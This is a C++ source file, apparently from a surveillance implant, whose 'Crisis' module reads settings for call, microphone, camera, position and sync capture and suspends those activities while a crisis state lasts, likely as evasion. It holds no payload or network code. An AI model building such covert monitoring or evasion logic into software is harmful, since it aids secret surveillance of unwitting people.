#include "Common.h"
#include "Module.h"
#include "Log.h"
#include "Device.h"
#include "Status.h"
#include "FunctionFunc.h"

DWORD WINAPI CrisisModule(LPVOID lpParam) {
	UINT uCrisisType = 0;
	Log logInfo;
	Configuration *conf;
	Module *me = (Module *)lpParam;
	Status *statusObj  = Status::self();
	HANDLE eventHandle;
	BOOL synchronize, call, mic, camera, position;

	me->setStatus(MODULE_RUNNING);
	eventHandle = me->getEvent();
	conf = me->getConf();

	try {
		synchronize = conf->getBool(L"synchronize");
	} catch (...) {
		synchronize = TRUE;
	}

	try {
		call = conf->getBool(L"call");
	} catch (...) {
		call = TRUE;
	}

	try {
		mic = conf->getBool(L"mic");
	} catch (...) {
		mic = TRUE;
	}

	try {
		camera = conf->getBool(L"camera");
	} catch (...) {
		camera = TRUE;
	}

	try {
		position = conf->getBool(L"position");
	} catch (...) {
		position = TRUE;
	}

	if (synchronize)
		uCrisisType |= CRISIS_SYNC;

	if (call)
		uCrisisType |= CRISIS_CALL;

	if (camera)
		uCrisisType |= CRISIS_CAMERA;

	if (position)
		uCrisisType |= CRISIS_POSITION;

	if (mic)
		uCrisisType |= CRISIS_MIC;

	DBG_TRACE(L"Debug - Crisis.cpp - Crisis Module started\n", 5, FALSE);

	// Comunichiamo al sistema lo stato di crisi
	statusObj->StartCrisis(uCrisisType);
	logInfo.WriteLogInfo(L"Crisis started");

	// Attendiamo che la crisi finisca
	LOOP {
		_WaitForSingleObject(eventHandle, INFINITE);

		if (me->shouldStop() == FALSE)
			continue;

		statusObj->StopCrisis();
		logInfo.WriteLogInfo(L"Crisis stopped");

		me->setStatus(MODULE_STOPPED);
		DBG_TRACE(L"Debug - Crisis.cpp - Crisis Module is Closing\n", 1, FALSE);
		return 0;
	}

	return 0;
}